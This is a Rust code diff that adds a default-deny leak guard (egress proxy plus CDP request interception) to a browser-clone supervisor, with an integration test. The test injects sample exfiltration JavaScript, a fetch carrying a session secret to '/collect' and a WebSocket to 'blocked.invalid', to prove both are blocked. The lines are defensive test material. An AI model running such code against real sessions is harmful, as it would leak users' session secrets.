@@ -46,7 +46,8 @@
 //! Everything blocks (subprocesses, sleeps, pipe reads). Hosts call it from
 //! `spawn_blocking`, like the rest of the process-touching core.
 
-use crate::{adapters, diagnostics};
+use crate::browser_clone_guard::{EgressProxy, GuardState};
+use crate::{adapters, browser_clone_guard, diagnostics};
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use std::{
@@ -251,6 +252,11 @@ pub struct CloneConfig {
     pub call_timeout: Duration,
     pub ram_disk_mib: u64,
     pub headless: bool,
+    /// Arm the leak guard: launch the clone behind the egress proxy and
+    /// intercept every request. The clone's [`GuardState`] starts empty
+    /// (default-deny), so a guarded clone reaches nothing until a caller allows
+    /// hosts on it. Part 3 turns this on whenever a real session is loaded.
+    pub guarded: bool,
 }
 
 impl Default for CloneConfig {
@@ -262,6 +268,7 @@ impl Default for CloneConfig {
             call_timeout: DEFAULT_CALL_TIMEOUT,
             ram_disk_mib: DEFAULT_RAM_DISK_MIB,
             headless: false,
+            guarded: false,
         }
     }
 }
@@ -399,9 +406,12 @@ fn validate_launch_args(args: &[String]) -> Result<(), CloneError> {
 /// One CDP connection over the browser's debugging pipe. The browser reads
 /// requests from its fd 3 and writes replies and events to its fd 4; each
 /// message is JSON followed by a NUL byte.
+type EventHandler = Arc<dyn Fn(&Value) + Send + Sync>;
+
 struct CdpPipe {
     writer: Mutex<File>,
     pending: Arc<Mutex<HashMap<u64, mpsc::Sender<Value>>>>,
+    on_event: Arc<Mutex<Option<EventHandler>>>,
     next_id: AtomicU64,
     closed: Arc<AtomicBool>,
 }
@@ -413,9 +423,11 @@ impl CdpPipe {
     /// closes its end.
     fn start(from_browser: File, to_browser: File) -> Arc<Self> {
         let pending: Arc<Mutex<HashMap<u64, mpsc::Sender<Value>>>> = Arc::default();
+        let on_event: Arc<Mutex<Option<EventHandler>>> = Arc::default();
         let closed = Arc::new(AtomicBool::new(false));
         {
             let pending = Arc::clone(&pending);
+            let on_event = Arc::clone(&on_event);
             let closed = Arc::clone(&closed);
             thread::spawn(move || {
                 let mut reader = BufReader::new(from_browser);
@@ -423,8 +435,17 @@ impl CdpPipe {
                     let Ok(message) = serde_json::from_slice::<Value>(&frame) else {
                         continue;
                     };
-                    // Events carry no id; only replies to our calls do.
+                    // Events carry no id; only replies to our calls do. An event
+                    // goes to the handler if one is registered (the leak guard),
+                    // so Fetch.requestPaused can be adjudicated. The handler only
+                    // writes (send_no_wait); it never waits on this same reader.
                     let Some(id) = message.get("id").and_then(Value::as_u64) else {
+                        if message.get("method").is_some() {
+                            let handler = lock(&on_event).clone();
+                            if let Some(handler) = handler {
+                                handler(&message);
+                            }
+                        }
                         continue;
                     };
                     let waiter = lock(&pending).remove(&id);
@@ -440,6 +461,7 @@ impl CdpPipe {
         Arc::new(Self {
             writer: Mutex::new(to_browser),
             pending,
+            on_event,
             next_id: AtomicU64::new(1),
             closed,
         })
@@ -499,6 +521,28 @@ impl CdpPipe {
             }
             Err(mpsc::RecvTimeoutError::Disconnected) => Err(CloneError::BrowserExited),
         }
+    }
+
+    /// Send a command and do not wait for its reply. Used for a Fetch verdict
+    /// dispatched from the event thread, which must not block on a reply the
+    /// reader thread it is downstream of would have to deliver.
+    fn send_no_wait(&self, session_id: Option<&str>, method: &str, params: Value) {
+        let id = self.next_id.fetch_add(1, Ordering::SeqCst);
+        let mut message = json!({ "id": id, "method": method, "params": params });
+        if let Some(session_id) = session_id {
+            message["sessionId"] = json!(session_id);
+        }
+        if let Ok(mut frame) = serde_json::to_vec(&message) {
+            frame.push(0);
+            let _ = lock(&self.writer).write_all(&frame);
+        }
+    }
+
+    /// Call `handler` for every event (a message with a `method` and no `id`).
+    /// The handler runs on the reader thread and must not block on a reply; it
+    /// may only `send_no_wait`. Replaces any previous handler.
+    fn set_event_handler(&self, handler: EventHandler) {
+        *lock(&self.on_event) = Some(handler);
     }
 
     #[cfg(test)]
@@ -880,6 +924,11 @@ struct LiveClone {
     child: Child,
     pipe: Arc<CdpPipe>,
     mount: PathBuf,
+    /// The leak guard's shared state, when this clone is guarded. Callers reach
+    /// it through [`CloneSupervisor::clone_guard`] to allow hosts and register
+    /// session secrets. The egress proxy shuts down when this clone drops.
+    guard: Option<Arc<Mutex<GuardState>>>,
+    _proxy: Option<Arc<EgressProxy>>,
 }
 
 /// Owns every clone this process started. Independent of
@@ -946,10 +995,30 @@ impl CloneSupervisor {
             return Err(error);
         }
 
+        // A guarded clone gets its own shared state and an egress proxy it is
+        // launched behind. The state starts empty, so it can reach nothing until
+        // a caller allows a host on it.
+        let (guard, proxy) = if self.config.guarded {
+            let state = Arc::new(Mutex::new(GuardState::new()));
+            match EgressProxy::start(Arc::clone(&state)) {
+                Ok(proxy) => (Some(state), Some(proxy)),
+                Err(error) => {
+                    self.discard(&mount);
+                    return Err(CloneError::Launch(format!("egress proxy: {error}")));
+                }
+            }
+        } else {
+            (None, None)
+        };
+
         let profile = mount.join(PROFILE_DIR_NAME);
+        let mut args = launch_args(&profile, self.config.headless);
+        if let Some(proxy) = &proxy {
+            args.extend(proxy.launch_args());
+        }
         let launched = fs::create_dir(&profile)
             .map_err(|error| CloneError::Launch(format!("profile dir: {error}")))
-            .and_then(|()| launch(&binary, &launch_args(&profile, self.config.headless)));
+            .and_then(|()| launch(&binary, &args));
         let (child, pipe) = match launched {
             Ok(launched) => launched,
             Err(error) => {
@@ -963,6 +1032,8 @@ impl CloneSupervisor {
             child,
             pipe: Arc::clone(&pipe),
             mount: mount.clone(),
+            guard: guard.clone(),
+            _proxy: proxy,
         };
         if let Err(error) = self.ledger.upsert(LedgerRecord {
             pid: Some(pid),
@@ -973,6 +1044,32 @@ impl CloneSupervisor {
         }
         match self.await_ready(&pipe) {
             Ok(product) => {
+                // Arm layer 1: intercept every request at the browser level and
+                // adjudicate it against the shared guard state. The handler runs
+                // on the pipe's reader thread and only writes its verdict, so it
+                // cannot deadlock; it holds a Weak so it never keeps the pipe
+                // (and thus the clone) alive.
+                if let Some(state) = &guard {
+                    let weak = Arc::downgrade(&pipe);
+                    let state = Arc::clone(state);
+                    pipe.set_event_handler(Arc::new(move |event| {
+                        if event.get("method").and_then(Value::as_str)
+                            != Some("Fetch.requestPaused")
+                        {
+                            return;
+                        }
+                        let Some(pipe) = weak.upgrade() else { return };
+                        let params = event.get("params").cloned().unwrap_or(Value::Null);
+                        let (command, command_params, _record) =
+                            browser_clone_guard::fetch_verdict(&state, &params);
+                        pipe.send_no_wait(None, command, command_params);
+                    }));
+                    let (method, params) = browser_clone_guard::fetch_enable_command();
+                    if let Err(error) = pipe.call(method, params, self.config.call_timeout) {
+                        let _ = self.teardown(live);
+                        return Err(error);
+                    }
+                }
                 lock(&self.clones).insert(id.clone(), live);
                 Ok(CloneInfo {
                     id,
@@ -986,6 +1083,13 @@ impl CloneSupervisor {
                 Err(error)
             }
         }
+    }
+
+    /// The leak guard's shared state for a guarded clone: allow hosts on it and
+    /// register the session secrets that must not leave to other hosts. `None`
+    /// for an unguarded clone or an unknown id.
+    pub fn clone_guard(&self, clone_id: &str) -> Option<Arc<Mutex<GuardState>>> {
+        lock(&self.clones).get(clone_id).and_then(|clone| clone.guard.clone())
     }
 
     /// Inject `cookies` into the clone as session cookies. They are readable
@@ -2324,6 +2428,137 @@ while (defined(my $raw = <$in>)) {
                 !String::from_utf8_lossy(&devices.stdout).contains(&info.id),
                 "hdiutil still lists the volume"
             );
+        }
+
+        /// A local server that records every path it is asked for, so a test can
+        /// prove a would-be leak never arrived. Returns its port and the log.
+        fn serve_recording_page() -> (u16, Arc<Mutex<Vec<String>>>) {
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            let port = listener.local_addr().unwrap().port();
+            let log: Arc<Mutex<Vec<String>>> = Arc::default();
+            let sink = Arc::clone(&log);
+            thread::spawn(move || {
+                for stream in listener.incoming() {
+                    let Ok(mut stream) = stream else { break };
+                    let mut buffer = [0u8; 2048];
+                    let read = stream.read(&mut buffer).unwrap_or(0);
+                    let request = String::from_utf8_lossy(&buffer[..read]);
+                    if let Some(path) = request.lines().next().and_then(|l| l.split(' ').nth(1)) {
+                        lock(&sink).push(path.to_owned());
+                    }
+                    let body = "<html><body>ok</body></html>";
+                    let _ = write!(
+                        stream,
+                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                        body.len()
+                    );
+                }
+            });
+            (port, log)
+        }
+
+        /// Both containment layers against a real browser: layer 1 fails a
+        /// same-origin request that carries a foreign session value, and layer 2
+        /// refuses a WebSocket to a host that is not allowed — the exact gap the
+        /// request checker cannot see.
+        #[test]
+        fn the_leak_guard_blocks_exfiltration_but_allows_the_task() {
+            let Some(browser) = live_browser() else { return };
+            let dir = tempfile::tempdir().unwrap();
+            let supervisor = CloneSupervisor::with_parts(
+                dir.path().join("browser-clones.json"),
+                dir.path().join("mounts"),
+                Box::new(RamDisk),
+                CloneConfig {
+                    browser: Some(browser),
+                    headless: true,
+                    guarded: true,
+                    ..CloneConfig::default()
+                },
+            );
+            let info = supervisor.spawn_clone().expect("the guarded clone starts");
+            let (port, log) = serve_recording_page();
+
+            // The clone may reach its own origin (127.0.0.1). A secret owned by a
+            // host it never contacts is registered, so any request carrying that
+            // secret anywhere is a leak.
+            let secret = "LEAKME_secret_1234567890";
+            {
+                let guard = supervisor.clone_guard(&info.id).expect("guarded");
+                let mut guard = guard.lock().unwrap();
+                guard.allow_host("127.0.0.1");
+                guard.add_secret("owner.example", secret);
+            }
+
+            let target = supervisor
+                .cdp(&info.id, None, "Target.createTarget", json!({ "url": "about:blank" }))
+                .unwrap();
+            let attached = supervisor
+                .cdp(
+                    &info.id,
+                    None,
+                    "Target.attachToTarget",
+                    json!({ "targetId": target["targetId"], "flatten": true }),
+                )
+                .unwrap();
+            let sid = attached["sessionId"].as_str().unwrap().to_owned();
+
+            // Layer 2 lets the allowed origin load.
+            supervisor
+                .cdp(&info.id, Some(&sid), "Page.navigate", json!({ "url": format!("http://127.0.0.1:{port}/") }))
+                .unwrap();
+            assert!(
+                wait_until(10_000, || lock(&log).iter().any(|p| p == "/")),
+                "the allowed page never loaded through the proxy"
+            );
+
+            // Layer 1: a same-origin request that smuggles the foreign secret is
+            // failed before it leaves, even though 127.0.0.1 is allowed.
+            let _ = supervisor.cdp(
+                &info.id,
+                Some(&sid),
+                "Runtime.evaluate",
+                json!({ "expression": format!(
+                    "fetch('/collect?c={secret}').catch(()=>{{}})"
+                ) }),
+            );
+            // Layer 2: a WebSocket to a host that is not allowed. The request
+            // checker never sees WebSockets; the proxy refuses the connection.
+            let _ = supervisor.cdp(
+                &info.id,
+                Some(&sid),
+                "Runtime.evaluate",
+                json!({ "expression":
+                    "try{new WebSocket('ws://blocked.invalid/leak')}catch(e){}"
+                }),
+            );
+
+            let guard = supervisor.clone_guard(&info.id).unwrap();
+            let blocked_l1 = wait_until(8000, || {
+                guard.lock().unwrap().blocked().iter().any(|b| b.layer == "request-checker")
+            });
+            let blocked_l2 = wait_until(8000, || {
+                guard
+                    .lock()
+                    .unwrap()
+                    .blocked()
+                    .iter()
+                    .any(|b| b.layer == "egress-proxy" && b.host == "blocked.invalid")
+            });
+            assert!(blocked_l1, "layer 1 did not block the secret-bearing request");
+            assert!(blocked_l2, "layer 2 did not block the WebSocket");
+            assert!(
+                !lock(&log).iter().any(|p| p.starts_with("/collect")),
+                "the leak reached the collector: {:?}",
+                lock(&log)
+            );
+            // No secret value ever appears in the audit records.
+            assert!(
+                guard.lock().unwrap().blocked().iter().all(|b| !b.reason.contains(secret)),
+                "a block record leaked the secret value"
+            );
+
+            supervisor.destroy(&info.id).unwrap();
         }
     }
 }
